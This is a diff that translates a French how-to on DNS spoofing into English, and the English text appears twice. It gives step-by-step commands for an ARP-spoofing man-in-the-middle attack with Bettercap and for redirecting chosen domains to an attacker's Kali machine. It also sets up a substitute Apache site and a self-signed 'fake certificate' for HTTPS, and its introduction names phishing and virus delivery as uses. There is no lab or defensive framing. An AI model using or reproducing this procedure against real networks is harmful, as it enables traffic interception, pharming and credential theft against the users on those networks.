@@ -1,62 +1,108 @@
+DNS spoofind | DNS poisoning
 
+DNS cache poisoning, DNS spoofing, or DNS cache pollution (DNS cache poisoning, DNS spoofing, or DNS cache  
+pollution in English) is a technique allowing DNS servers to be deceived into believing that they receive    
+a valid response to a request they make, even though it is fraudulent. Once the DNS server has been           
+poisoned, the information is cached, making all users of that server vulnerable. This type of attack           
+allows, for example, to send a user to a fake site whose content can be used for phishing (in the case of      
+DNS, we speak of pharming) or as a vector for viruses and other malicious applications.                        
+                                                                                                              
+
+-> How to do a DNS spoofing
+
+1. Flush the iptables tables.
 $ sudo iptables -F -t nat
->>> effacement table nat.
 
+2. Use Bettercap to start an ARP spoofing. 
 $ sudo bettercap
->>> mise en place de l'arp spoofing.
-» set arp.spoof.fullduplex true
-» set arp.spoof.targets <ip cible>
-» arp.spoof on
+  » set arp.spoof.fullduplex true
+  » set arp.spoof.targets <target ip>
+  » arp.spoof on
 
->>> mise en place du dns spoofing.
-» set dns.spoof.all true				> dns spoofing activé sur toutes les requetes.
-» set dns.spoof.domains example.com,*.example.com	> on définit la liste des domaines à usurper.
-» set dns.spoof.address <ip_kali>			> on définit la machine quiva faire office de DNS.
-» dns.spoof on						> on démarre le dns spoofing.
+3. Use Bettercap to start DNS spoofing.
+» set dns.spoof.all true				> dns spoofing is activated on all requests.
+» set dns.spoof.domains example.com,*.example.com	> we define domains to be usurpated.
+» set dns.spoof.address <kali ip>			> set the new DNS.
+» dns.spoof on						> start the dns spoofing.
 
->>> lancement du serveur apache (de substitution).
+4. Start the web server of substitution.
 $ sudo service apache2 start
----> modififiez la page index.htm dans /var/www/html/index.html
+>>> At this point, you could modify the /var/www/html/index.html defaut page.
 
-Rem: pour https, nous pouvons créer un faux certificat avec:
-$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key -out /etc/ssl/certs/apache-selfsigned.crt
+5. Now, on the target machine, example.com will be redirected to the Kali web server.
 
-Modifier le site:
+6. For https, we can create fake certificat.
+$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key 
+       -out /etc/ssl/certs/apache-selfsigned.crt
+
+Change the site:
 vi /etc/apache2/sites-available/default-ssl.conf
 
-Modifiez les lignes suivantes avec les nouveaux certifiats:
+Modify those lines with the new certificate:
 SSLCertificateFile	/etc/ssl/certs/apache-selfsigned.crt
 SSLCertificateKeyFile	/etc/ssl/private/apache-selfsigned.key
 
-Activation de la version sécurisée de apache:
+Activate the secured version of Apache:
 $ sudo a2ensite default-ssl.conf
 
-Redémarrage serveur web:
+Restart Apache:
+$ sudo service apache2 stop
 $ sudo service apache2 start
 
 >@
->@#################################################################################
+>@##################################################################################################################
+>@#                                                                                                                #                                     
+>@# [ DNS spoofind | DNS poisoning ]                                                                               #                   
+>@#                                                                                                                #                                     
+>@# DNS cache poisoning, DNS spoofing, or DNS cache pollution (DNS cache poisoning, DNS spoofing, or DNS cache     #
+>@# pollution in English) is a technique allowing DNS servers to be deceived into believing that they receive      #
+>@# a valid response to a request they make, even though it is fraudulent. Once the DNS server has been            #
+>@# poisoned, the information is cached, making all users of that server vulnerable. This type of attack           #
+>@# allows, for example, to send a user to a fake site whose content can be used for phishing (in the case of      #
+>@# DNS, we speak of pharming) or as a vector for viruses and other malicious applications.                        #
+>@#                                                                                                                #                                     
+>@#----------------------------------------------------------------------------------------------------------------# 
 >@
->@* Flush des tables iptables
+>@-> How to do a DNS spoofing
+>@
+>@1. Flush the iptables tables.
 >@$ sudo iptables -F -t nat
 >@
->@* Bettercap
->@» set arp.spoof.fullduplex true
->@» set arp.spoof.targets <ip cible>
->@» arp.spoof on
+>@2. Use Bettercap to start an ARP spoofing. 
+>@$ sudo bettercap
+>@  » set arp.spoof.fullduplex true
+>@  » set arp.spoof.targets <target ip>
+>@  » arp.spoof on
 >@
+>@3. Use Bettercap to start DNS spoofing.
+>@» set dns.spoof.all true				> dns spoofing is activated on all requests.
+>@» set dns.spoof.domains example.com,*.example.com	> we define domains to be usurpated.
+>@» set dns.spoof.address <kali ip>			> set the new DNS.
+>@» dns.spoof on						> start the dns spoofing.
 >@
->@» set dns.spoof.all true				
->@» set dns.spoof.domains example.com,*.example.com
->@» set dns.spoof.address <ip_kali>		
->@» dns.spoof on			
->@
->@* Serveur apache sur kali
+>@4. Start the web server of substitution.
 >@$ sudo service apache2 start
->@---> modififiez la page index.htm dans /var/www/html/index.html
+>@>>> At this point, you could modify the /var/www/html/index.html defaut page.
 >@
->@* Generation de certificat
->@---> voir fichier howto-037-dns-spoofing.txt
+>@5. Now, on the target machine, example.com will be redirected to the Kali web server.
 >@
->@#################################################################################
+>@6. For https, we can create fake certificat.
+>@$ sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/ssl/private/apache-selfsigned.key 
+>@       -out /etc/ssl/certs/apache-selfsigned.crt
+>@
+>@Change the site:
+>@vi /etc/apache2/sites-available/default-ssl.conf
+>@
+>@Modify those lines with the new certificate:
+>@SSLCertificateFile	/etc/ssl/certs/apache-selfsigned.crt
+>@SSLCertificateKeyFile	/etc/ssl/private/apache-selfsigned.key
+>@
+>@Activate the secured version of Apache:
+>@$ sudo a2ensite default-ssl.conf
+>@
+>@Restart Apache:
+>@$ sudo service apache2 stop
+>@$ sudo service apache2 start
+>@
+##################################################################################################################
 >@
